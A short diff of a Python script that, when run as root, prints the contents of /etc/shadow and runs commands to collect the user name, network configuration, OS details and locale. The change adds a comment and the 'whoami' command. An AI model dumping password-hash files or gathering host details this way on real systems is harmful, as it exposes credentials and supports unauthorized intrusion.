@@ -8,6 +8,7 @@ os.chdir('/etc')
 if os.geteuid() != 0:
     print("Err. You are not root.")
 
+# get the password file
 with open("shadow", "r") as f:
     f.seek(0)  # from the begining of the file
     print("*******************")
@@ -16,7 +17,7 @@ with open("shadow", "r") as f:
     print(f.read())
 
 # other information we want:
-cmd = ['ifconfig', 'hostnamectl', 'locale']  # ip, os information, language
+cmd = ['whoami', 'ifconfig', 'hostnamectl', 'locale']  # user, ip, os information, language
 for c in cmd:
     os.popen(c,'w')  # write throwgh cmd
     data = os.popen(c).read()  # read from cmd
